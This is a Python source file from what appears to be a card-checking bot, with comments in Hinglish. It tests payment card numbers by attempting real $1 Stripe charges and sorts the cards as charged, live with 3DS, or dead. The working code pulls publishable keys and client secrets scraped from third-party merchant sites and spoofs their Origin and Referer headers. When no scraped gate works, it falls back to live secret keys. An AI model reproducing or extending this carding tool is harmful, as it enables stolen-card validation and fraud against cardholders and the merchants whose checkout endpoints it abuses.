"""
gateways/charge_gate.py — Real PaymentIntent Charge Checker

/b3 command ke liye:
- Scraped gates (PaymentIntent type) se $1 real charge attempt
- Stripe SK se direct PaymentIntent (agar live account ho)
- CHARGED = actual money attempt hua
- LIVE_VBV = card live hai, 3DS chahiye (charge nahi hua)
- DEAD = card declined

Difference from /chk (SetupIntent):
  SetupIntent → Sirf auth check (no charge)  
  PaymentIntent → Actual $1 charge attempt → CHARGED agar success
"""
import asyncio
import random
import aiohttp
from aiohttp import ClientTimeout

from gateways.base import GatewayResult, CCStatus
from gateways.stripe_gate import STRIPE_API_HEADERS, STRIPE_JS_HEADERS, STRIPE_DECLINE_MAP
from core.parser import CardData
import config

TIMEOUT = ClientTimeout(total=18)

# Charge amount in cents — $1 = 100
CHARGE_AMOUNT = 100
CHARGE_CURRENCY = "usd"


def _parse_payment_intent(pi: dict) -> GatewayResult:
    """Parse PaymentIntent confirm response → GatewayResult."""
    status = pi.get("status", "")
    gateway_name = pi.get("_gate", "Charge")

    if "error" in pi:
        err = pi["error"]
        decline_code = err.get("decline_code", "")
        error_code   = err.get("code", "")
        message      = err.get("message", "Unknown error")
        cc_status    = STRIPE_DECLINE_MAP.get(
            decline_code,
            STRIPE_DECLINE_MAP.get(error_code, CCStatus.DEAD)
        )
        return GatewayResult(
            status=cc_status, gateway=gateway_name,
            message=message, raw_code=decline_code or error_code,
        )

    # ✅ Succeeded = Card charged!
    if status == "succeeded":
        amount = pi.get("amount", CHARGE_AMOUNT) / 100
        return GatewayResult(
            status=CCStatus.CHARGED, gateway=gateway_name,
            message=f"Charged ${amount:.2f} ✅ Non-VBV LIVE!",
            is_non_vbv=True, charge_amount=amount,
        )

    # 🔐 requires_action = VBV/3DS (card is LIVE but needs 3DS)
    if status == "requires_action":
        return GatewayResult(
            status=CCStatus.LIVE_VBV, gateway=gateway_name,
            message="Card Live 🔐 VBV/3DS Required",
            is_vbv=True,
        )

    # ⚠️ requires_capture = authorized but not captured (live non-vbv)
    if status == "requires_capture":
        return GatewayResult(
            status=CCStatus.CHARGED, gateway=gateway_name,
            message="Authorized ✅ Non-VBV LIVE (requires capture)",
            is_non_vbv=True,
        )

    # ❌ Declined
    if status in ("requires_payment_method", "canceled"):
        last_err = pi.get("last_payment_error", {}) or {}
        decline_code = last_err.get("decline_code", "")
        error_code   = last_err.get("code", "")
        message      = last_err.get("message", "Card declined")
        cc_status    = STRIPE_DECLINE_MAP.get(
            decline_code,
            STRIPE_DECLINE_MAP.get(error_code, CCStatus.DEAD)
        )
        return GatewayResult(
            status=cc_status, gateway=gateway_name,
            message=message, raw_code=decline_code or error_code,
        )

    return GatewayResult(
        status=CCStatus.ERROR, gateway=gateway_name,
        message=f"Unexpected PI status: {status}",
        raw_code=status,
    )


async def _charge_via_scraped_gate(
    session: aiohttp.ClientSession,
    card: CardData,
    gate: dict,
) -> GatewayResult | None:
    """
    Try to charge using a scraped PaymentIntent gate.
    Returns None if gate doesn't support PaymentIntent.
    """
    intent_type = gate.get("intent_type", "payment_intent")
    if intent_type != "payment_intent":
        return None  # Skip SetupIntent gates

    domain    = gate.get("domain", "")
    pk_key    = gate.get("pk_key", "")
    endpoint  = gate.get("endpoint", "")

    if not pk_key or not endpoint:
        return None

    # Get fresh client_secret
    from gateways.scraped_gate import _get_client_secret
    client_secret = await _get_client_secret(session, gate)
    if not client_secret or not client_secret.startswith("pi_"):
        return None

    pi_id = client_secret.split("_secret_")[0]

    data = {
        "client_secret": client_secret,
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": card.number,
        "payment_method_data[card][exp_month]": card.month,
        "payment_method_data[card][exp_year]": card.year,
        "payment_method_data[card][cvc]": card.cvv,
        "payment_method_data[billing_details][address][country]": "US",
        "payment_method_data[billing_details][address][postal_code]": "10001",
    }

    headers = {
        **STRIPE_JS_HEADERS,
        "Authorization": f"Bearer {pk_key}",
        "Origin": f"https://{domain}",
        "Referer": f"https://{domain}/",
    }

    try:
        async with session.post(
            f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
            data=data,
            headers=headers,
            timeout=TIMEOUT,
        ) as r:
            result = await r.json(content_type=None)
            result["_gate"] = "Stripe B3"
            return _parse_payment_intent(result)
    except Exception:
        return None


async def _charge_via_stripe_sk(
    session: aiohttp.ClientSession,
    card: CardData,
    sk: str,
    pk: str,
) -> GatewayResult:
    """
    Create + confirm PaymentIntent using own Stripe keys.
    This is a REAL $1 charge — only works if account is fully activated.
    """
    # Step 1: Create PaymentIntent
    data = {
        "amount": str(CHARGE_AMOUNT),
        "currency": CHARGE_CURRENCY,
        "payment_method_types[]": "card",
        "capture_method": "automatic",
        "confirm": "false",
    }
    headers_sk = {**STRIPE_API_HEADERS, "Authorization": f"Bearer {sk}"}

    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_intents",
            data=data, headers=headers_sk, timeout=TIMEOUT,
        ) as r:
            pi = await r.json(content_type=None)

        if "error" in pi:
            err = pi["error"]
            # Blocked account error
            if "testmode_charges_only" in err.get("code", ""):
                return GatewayResult(
                    status=CCStatus.ERROR, gateway="Stripe/SK",
                    message="⚠️ Stripe account not activated for live charges",
                    raw_code="account_not_live",
                )
            return GatewayResult(
                status=CCStatus.ERROR, gateway="Stripe/SK",
                message=err.get("message", "PI create failed"),
                raw_code=err.get("code", ""),
            )

        pi_id       = pi["id"]
        client_secret = pi["client_secret"]

        await asyncio.sleep(random.uniform(0.2, 0.4))

        # Step 2: Confirm with card
        confirm_data = {
            "client_secret": client_secret,
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card.number,
            "payment_method_data[card][exp_month]": card.month,
            "payment_method_data[card][exp_year]": card.year,
            "payment_method_data[card][cvc]": card.cvv,
        }

        # Try PK first (browser-like), fallback to SK
        if pk:
            headers_pk = {**STRIPE_JS_HEADERS, "Authorization": f"Bearer {pk}"}
            async with session.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                data=confirm_data, headers=headers_pk, timeout=TIMEOUT,
            ) as r:
                result = await r.json(content_type=None)
        else:
            async with session.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                data=confirm_data, headers=headers_sk, timeout=TIMEOUT,
            ) as r:
                result = await r.json(content_type=None)

        result["_gate"] = "Stripe B3"
        return _parse_payment_intent(result)

    except asyncio.TimeoutError:
        return GatewayResult(
            status=CCStatus.ERROR, gateway="Stripe/SK",
            message="Timeout", raw_code="timeout",
        )
    except Exception as e:
        return GatewayResult(
            status=CCStatus.ERROR, gateway="Stripe/SK",
            message=str(e)[:80], raw_code="exception",
        )


async def check_charge(card: CardData) -> GatewayResult:
    """
    /b3 command — Real PaymentIntent charge check.
    
    Priority:
    1. Scraped PaymentIntent gates (from /gscan)
    2. Own Stripe SK (if configured)
    3. Error if nothing available
    """
    import database.db as db

    async with aiohttp.ClientSession() as session:

        # ── Priority 1: Scraped PaymentIntent gates ───────────────────────────
        gates = await db.get_active_gates()
        pi_gates = [g for g in gates if g.get("intent_type") == "payment_intent"]

        for gate in pi_gates:
            result = await _charge_via_scraped_gate(session, card, gate)
            if result is None:
                continue
            if result.status != CCStatus.ERROR:
                await db.update_gate_stats(gate["id"], success=True)
                return result
            await db.update_gate_stats(gate["id"], success=False)
            await asyncio.sleep(0.3)

        # ── Priority 2: Own Stripe SK ─────────────────────────────────────────
        if config.STRIPE_KEYS:
            idx = random.randrange(len(config.STRIPE_KEYS))
            sk  = config.STRIPE_KEYS[idx]
            pk  = ""
            if config.STRIPE_PK_KEYS:
                pk_idx = idx if idx < len(config.STRIPE_PK_KEYS) else 0
                pk = config.STRIPE_PK_KEYS[pk_idx]

            if sk.startswith("sk_live_"):
                result = await _charge_via_stripe_sk(session, card, sk, pk)
                return result

        # ── No working gate ───────────────────────────────────────────────────
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway="B3",
            message=(
                "❌ No PaymentIntent gates available!\n\n"
                "Options:\n"
                "1️⃣ /gscan <url> — Scan sites for PaymentIntent gates\n"
                "2️⃣ Activate your Stripe account for live charges\n\n"
                "💡 /chk still works for VBV/Non-VBV detection!"
            ),
            raw_code="no_pi_gate",
        )
